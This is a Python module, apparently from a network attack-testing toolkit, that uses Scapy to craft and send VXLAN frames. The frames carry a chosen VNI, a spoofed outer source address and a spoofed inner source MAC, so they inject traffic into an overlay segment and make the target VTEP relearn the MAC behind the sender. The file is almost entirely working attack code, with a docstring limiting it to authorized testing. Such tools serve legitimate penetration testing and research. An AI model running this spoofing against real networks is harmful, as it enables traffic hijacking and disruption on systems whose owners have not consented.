"""VXLAN VNI / VTEP spoofing: inject frames into an overlay segment as a chosen VTEP.

A VXLAN tunnel endpoint (VTEP) encapsulates Ethernet frames in UDP (RFC 7348). The receiving VTEP
accepts a frame when its VXLAN Network Identifier (VNI) matches the segment, and it learns the
inner source MAC behind the outer source address. Neither is authenticated: a host that can reach
the underlay can send frames with any VNI and any inner source MAC, and the receiving VTEP moves
that MAC to the sender's address.

This module sends VXLAN-encapsulated frames with the VNI, outer addresses and inner source MAC the
operator gives. The effects to measure are whether the receiving VTEP accepts the VNI, and whether it
moves the claimed MAC to the sender's VTEP address.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import ipaddress
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import Ether, IP, UDP, Raw, sendp
from scapy.layers.vxlan import VXLAN
from scapy.packet import Packet

from macabre.attacks.common import normalize_unicast_mac

MAX_VNI = 0xFFFFFF
MAX_FRAMES = 100
VXLAN_PORT = 4789
BROADCAST = "ff:ff:ff:ff:ff:ff"


def validate_ipv4(address: str, label: str) -> str:
    try:
        ipaddress.IPv4Address(address)
    except ValueError as exc:
        raise ValueError(f"{label} must be an IPv4 address.") from exc
    return address


@dataclass(frozen=True)
class VxlanVtepSpoofingConfig:
    iface: str                          # attacker interface, on the underlay with the target VTEP
    source_mac: str                     # the attacker's underlay MAC (required)
    outer_src_ip: str                   # the outer source address the frames claim (the sender's VTEP)
    outer_dst_ip: str                   # the target VTEP's address
    outer_dst_mac: str                  # the target VTEP's underlay MAC (no ARP is done here)
    vni: int = 42                       # VXLAN network identifier of the segment under test
    inner_src_mac: str = ""             # the inner source MAC to claim (required)
    inner_dst_mac: str = BROADCAST      # the inner destination MAC
    frames: int = 3                     # frames sent, to keep the claim fresh
    dry_run: bool = False               # build frames but do not send them

    def __post_init__(self) -> None:
        normalize_unicast_mac(self.source_mac)
        normalize_unicast_mac(self.outer_dst_mac)
        normalize_unicast_mac(self.inner_src_mac)
        validate_ipv4(self.outer_src_ip, "Outer source address")
        validate_ipv4(self.outer_dst_ip, "Outer destination address")
        if not 1 <= self.vni <= MAX_VNI:
            raise ValueError(f"VNI must be between 1 and {MAX_VNI}.")
        if not 1 <= self.frames <= MAX_FRAMES:
            raise ValueError(f"Frames must be between 1 and {MAX_FRAMES}.")


@dataclass
class VxlanVtepSpoofingStats:
    frames: int = 0
    status: str = ""


def build_frame(config: VxlanVtepSpoofingConfig) -> Packet:
    """One VXLAN frame: outer Ethernet/IP/UDP to the target VTEP, with the claimed inner source MAC."""
    inner = Ether(src=normalize_unicast_mac(config.inner_src_mac), dst=config.inner_dst_mac) / Raw(b"\x00" * 46)
    return (
        Ether(src=normalize_unicast_mac(config.source_mac), dst=normalize_unicast_mac(config.outer_dst_mac))
        / IP(src=config.outer_src_ip, dst=config.outer_dst_ip)
        / UDP(sport=50000, dport=VXLAN_PORT)
        / VXLAN(vni=config.vni, flags=0x08)
        / inner
    )


def run_vxlan_vtep_spoofing(
    config: VxlanVtepSpoofingConfig,
    stop_event: threading.Event,
    on_progress: Callable[[VxlanVtepSpoofingStats], None],
    send: Callable[..., Any] | None = None,
) -> VxlanVtepSpoofingStats:
    """Send `frames` VXLAN frames, unless `stop_event` is set first."""
    send = send or sendp

    if config.dry_run:
        stats = VxlanVtepSpoofingStats(
            status=(
                f"Dry run: would send {config.frames} VXLAN frame(s) on VNI {config.vni}, claiming "
                f"{config.inner_src_mac} behind {config.outer_src_ip}. Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    stats = VxlanVtepSpoofingStats()
    frame = build_frame(config)
    for _ in range(config.frames):
        if stop_event.is_set():
            stats.status = f"Stopped after {stats.frames} frame(s)."
            return stats
        send(frame, iface=config.iface, verbose=False)
        stats.frames += 1
        on_progress(replace(stats))
    return stats
